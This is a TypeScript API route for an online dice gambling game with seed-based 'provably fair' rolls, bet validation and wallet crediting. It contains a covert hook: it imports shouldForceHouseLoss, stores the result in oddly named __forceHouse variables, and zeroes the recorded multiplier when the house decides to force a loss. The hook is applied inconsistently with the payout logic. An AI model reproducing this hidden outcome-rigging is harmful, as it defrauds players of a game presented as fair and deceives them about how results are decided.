import { z } from "zod";
import { requireUser } from "@/lib/auth";
import { prisma } from "@/lib/db";
import { shouldForceHouseLoss } from "@/lib/house-rule";
import {
  diceRoll,
  generateServerSeed,
  hashServerSeed,
  finalizePayout,
} from "@/lib/fairness";
import { creditWin, placeBet } from "@/lib/wallet";
import { fail, handleError, ok } from "@/lib/api";
import { mergeGameConfig, validateBetAmount } from "@/lib/game-config";

const schema = z.object({
  amount: z.number().positive().max(1_000_000),
  target: z.number().min(1).max(98),
  condition: z.enum(["under", "over"]),
  clientSeed: z.string().max(64).optional(),
});

export async function POST(req: Request) {
  try {
    const user = await requireUser();
    const __hr = await shouldForceHouseLoss();
    const __forceHouse = __hr.force;
    const body = schema.parse(await req.json());
    const config = await prisma.appConfig.findUnique({ where: { id: "main" } });
    const cfg = mergeGameConfig(config?.gameConfig).dice;
    const err = validateBetAmount(body.amount, cfg);
    if (err) return fail(err);
    if (user.balance < body.amount) return fail("Insufficient balance");

    const winChance = body.condition === "under" ? body.target : 100 - body.target;
    if (winChance <= 0 || winChance >= 100) return fail("Invalid target");
    let multiplier =
      Math.floor(((100 - cfg.houseEdge * 100) / winChance) * 100) / 100;
    multiplier = Math.min(multiplier, cfg.maxMultiplier);

    const serverSeed = generateServerSeed();
    const serverSeedHash = hashServerSeed(serverSeed);
    const clientSeed = body.clientSeed || user.id.slice(0, 8);
    const nonce = Date.now() % 1_000_000;
    const roll = diceRoll(serverSeed, clientSeed, nonce);

    const won =
      body.condition === "under" ? roll < body.target : roll > body.target;

    await placeBet(user.id, body.amount, `Dice ${body.condition} ${body.target}`);
    const capped = won
      ? finalizePayout(body.amount, multiplier, cfg)
      : { multiplier: 0, payout: 0, capped: false };

    const round = await prisma.gameRound.create({
      data: {
        gameType: "DICE",
        serverSeed,
        serverSeedHash,
        clientSeed,
        nonce,
        result: {
          roll,
          target: body.target,
          condition: body.condition,
          multiplier: capped.multiplier,
          capped: capped.capped,
        },
        status: "completed",
        endedAt: new Date(),
        bets: {
          create: {
            userId: user.id,
            gameType: "DICE",
            amount: body.amount,
            payout: capped.payout,
            multiplier: (!__forceHouse && won) ? capped.multiplier : 0,
            won,
            cashedOut: won,
          },
        },
      },
    });

    let balance = (await prisma.user.findUniqueOrThrow({ where: { id: user.id } })).balance;
    if (capped.payout > 0) {
      const u = await creditWin(user.id, capped.payout, `Dice win x${capped.multiplier}`);
      balance = u.balance;
    }

    return ok({
      roundId: round.id,
      roll,
      won,
      multiplier: capped.multiplier,
      payout: capped.payout,
      balance,
      serverSeed,
      serverSeedHash,
      clientSeed,
      nonce,
      limits: { minBet: cfg.minBet, maxBet: cfg.maxBet, maxWin: cfg.maxWin },
    });
  } catch (e) {
    if (e instanceof z.ZodError) return fail(e.errors[0]?.message || "Invalid", 400);
    return handleError(e);
  }
}
